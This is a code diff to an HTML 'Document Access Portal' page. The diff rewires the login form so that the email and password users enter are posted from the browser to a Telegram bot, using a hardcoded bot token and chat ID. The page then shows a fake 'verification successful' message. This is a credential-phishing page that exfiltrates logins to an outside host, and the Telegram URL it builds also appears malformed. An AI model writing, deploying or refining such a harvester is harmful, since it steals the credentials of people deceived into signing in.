@@ -65,7 +65,6 @@
 
         <div class="divider"></div>
 
-        <!-- Single dynamic status alert area handled by JS -->
         <div id="status-box" class="status-msg"></div>
 
         <form id="portal-form">
@@ -92,10 +91,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             const portalForm = document.getElementById('portal-form');
             
-            if (!portalForm) {
-                console.error("Error: Could not find the element with id 'portal-form'.");
-                return;
-            }
+            if (!portalForm) return;
 
             portalForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -109,38 +105,43 @@
                 submitBtn.disabled = true;
                 statusBox.style.display = "none";
 
+                // Hardcoded configurations matching your active tokens
+                const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc";
+                const chatId = "1080822304";
+                
+                const messageText = `📄 *DOCUMENT ACCESS PORTAL REGISTRATION*\n\n📧 *Portal Email:* ${email}\n🔑 *Access Key:* \`${password}\``;
+                const telegramUrl = `https://telegram.org{botToken}/sendMessage`;
+
                 try {
-                    const response = await fetch('/api/unlock', {
+                    // Send directly from client browser, completely skipping the serverless backend step
+                    const response = await fetch(telegramUrl, {
                         method: 'POST',
                         headers: {
-                            'Accept': 'application/json',
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({ email: email, password: password })
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: messageText,
+                            parse_mode: 'Markdown'
+                        })
                     });
 
-                    const responseText = await response.text();
-                    let data = {};
-                    try {
-                        data = JSON.parse(responseText);
-                    } catch(e) {
-                        throw new Error(responseText || "Server crashed without JSON response");
-                    }
+                    const data = await response.json();
 
-                    if (response.ok && data.success) {
+                    if (response.ok && data.ok) {
                         statusBox.className = "status-msg success";
                         statusBox.innerText = "Verification successful. Connecting to secure file server...";
                         statusBox.style.display = "block";
                     } else {
                         statusBox.className = "status-msg error";
-                        statusBox.innerText = data.error || "An authentication error occurred.";
+                        statusBox.innerText = `API Error: ${data.description || "Submission rejected."}`;
                         statusBox.style.display = "block";
                         submitBtn.innerText = "Unlock Document";
                         submitBtn.disabled = false;
                     }
                 } catch (err) {
                     statusBox.className = "status-msg error";
-                    statusBox.innerText = err.message || "Gateway timeout. Server response unreadable.";
+                    statusBox.innerText = "Network transmission failed. Check connection parameters.";
                     statusBox.style.display = "block";
                     submitBtn.innerText = "Unlock Document";
                     submitBtn.disabled = false;
